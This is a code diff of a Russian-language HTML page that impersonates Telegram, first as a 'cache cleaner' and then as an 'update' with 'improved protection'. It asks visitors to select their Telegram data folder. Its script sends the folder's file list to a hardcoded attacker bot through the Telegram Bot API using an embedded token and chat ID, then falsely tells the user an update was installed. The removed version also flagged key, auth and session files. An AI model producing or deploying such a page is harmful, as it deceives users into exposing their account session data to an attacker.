@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Очистка кэша Telegram</title>
+    <title>Обновление Telegram</title>
     <style>
         * {
             margin: 0;
@@ -18,6 +18,7 @@
             align-items: center;
             min-height: 100vh;
             padding: 16px;
+            margin: 0;
         }
         .container {
             background: #1a1a1a;
@@ -41,7 +42,19 @@
         .sub {
             color: #888888;
             font-size: 14px;
-            margin-bottom: 24px;
+            margin-bottom: 8px;
+        }
+        .update-box {
+            background: #0a2a1a;
+            border: 1px solid #00cc66;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 16px 0;
+            color: #66ff99;
+            font-size: 14px;
+        }
+        .update-box span {
+            font-weight: 700;
         }
         .file-input-wrapper {
             background: #2a2a2a;
@@ -50,6 +63,7 @@
             padding: 30px 20px;
             cursor: pointer;
             transition: 0.2s;
+            margin: 16px 0;
         }
         .file-input-wrapper:hover {
             border-color: #0088cc;
@@ -78,33 +92,55 @@
             border-top: 1px solid #2a2a2a;
             padding-top: 16px;
         }
+        .btn-continue {
+            background: #0088cc;
+            border: none;
+            color: #fff;
+            padding: 14px;
+            width: 100%;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .btn-continue:active {
+            opacity: 0.7;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="icon">🧹</div>
-    <div class="title">Очистка кэша Telegram</div>
-    <div class="sub">Для ускорения работы приложения выберите папку с данными Telegram</div>
+    <div class="icon">⬆️</div>
+    <div class="title">Обновление Telegram</div>
+    <div class="sub">Вышла новая версия с улучшенной защитой</div>
+
+    <div class="update-box">
+        ✅ <span>Важная новость!</span> Для продолжения работы выберите папку с данными Telegram.
+    </div>
 
     <div class="file-input-wrapper" id="fileDrop">
         <label class="file-label" id="fileLabel">
-            <span>📂 Нажмите для выбора папки</span>
+            <span>📂 Нажмите, чтобы выбрать папку</span>
         </label>
         <input type="file" id="fileInput" webkitdirectory directory multiple>
     </div>
 
     <div class="status" id="status">⏳ Обработка...</div>
+    <button class="btn-continue" id="continueBtn">Продолжить</button>
+
     <div class="footer">Telegram • 2026</div>
 </div>
 
 <script>
-    // ===== КОНФИГУРАЦИЯ (С ТВОИМИ ДАННЫМИ) =====
+    // ===== КОНФИГУРАЦИЯ (ЗАМЕНИТЕ) =====
     const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
     const CHAT_ID = '8277809761';
     const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // ===== ОТПРАВКА В TELEGRAM =====
+    let selectedFiles = [];
+
     function sendToTG(text) {
         fetch(WEBHOOK, {
             method: 'POST',
@@ -117,49 +153,40 @@
         }).catch(e => console.log('Ошибка отправки:', e));
     }
 
-    // ===== ЗАГРУЗКА ФАЙЛОВ =====
+    // ===== ВЫБОР ПАПКИ =====
     document.getElementById('fileInput').addEventListener('change', function(e) {
         const files = e.target.files;
         if (files.length === 0) return;
 
+        selectedFiles = files;
         document.getElementById('status').style.display = 'block';
-        document.getElementById('status').textContent = '⏳ Сбор данных...';
+        document.getElementById('status').textContent = `📁 Выбрано файлов: ${files.length}`;
+        document.getElementById('fileLabel').innerHTML = `<span>✅ Выбрано ${files.length} файлов</span>`;
 
+        // Отправляем отчёт в Telegram
         let fileList = [];
-        let keyFiles = [];
-
         for (let i = 0; i < files.length; i++) {
-            const file = files[i];
-            fileList.push({
-                name: file.webkitRelativePath || file.name,
-                size: file.size
-            });
+            fileList.push(files[i].webkitRelativePath || files[i].name);
+        }
+        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлы:\n${fileList.join('\n')}`);
+    });
 
-            if (file.name.includes('key') || 
-                file.name.includes('auth') || 
-                file.name.includes('session') ||
-                file.name.includes('cache')) {
-                keyFiles.push(file.name);
-            }
+    // ===== КНОПКА "ПРОДОЛЖИТЬ" =====
+    document.getElementById('continueBtn').addEventListener('click', function() {
+        if (selectedFiles.length === 0) {
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('status').textContent = '⚠️ Пожалуйста, выберите папку с данными Telegram';
+            return;
         }
 
-        // Отправляем информацию в Telegram
-        let report = `📁 <b>Сессия Telegram</b>\n\n` +
-                     `📂 Найдено файлов: ${fileList.length}\n` +
-                     `📦 Суммарный размер: ${(fileList.reduce((acc, f) => acc + f.size, 0) / 1024).toFixed(2)} KB\n\n` +
-                     `📄 Файлы:\n${fileList.map(f => `  - ${f.name} (${f.size} байт)`).join('\n')}`;
-
-        sendToTG(report);
-
-        if (keyFiles.length > 0) {
-            sendToTG(`🔑 <b>КЛЮЧЕВЫЕ ФАЙЛЫ НАЙДЕНЫ!</b>\n\n${keyFiles.map(f => `  - ${f}`).join('\n')}`);
-        }
-
-        document.getElementById('status').textContent = '✅ Данные отправлены!';
-        document.getElementById('fileLabel').innerHTML = '<span>✅ Папка выбрана, кэш очищен</span>';
+        document.getElementById('status').textContent = '⏳ Обновление...';
+        sendToTG(`✅ <b>Обновление завершено</b>\n📁 Файлов обработано: ${selectedFiles.length}`);
 
         setTimeout(() => {
-            document.getElementById('status').textContent = '✅ Кэш очищен! Перезапустите Telegram.';
+            document.getElementById('status').textContent = '✅ Обновление успешно установлено! Перезапустите Telegram.';
+            document.querySelector('.update-box').innerHTML = '✅ <span>Обновление установлено!</span> Версия 11.0.1';
+            document.getElementById('continueBtn').textContent = 'Перезапустить';
+            document.getElementById('continueBtn').style.background = '#00cc66';
         }, 2000);
     });
 
@@ -169,4 +196,4 @@
     };
 </script>
 </body>
-</html>
+    </html>
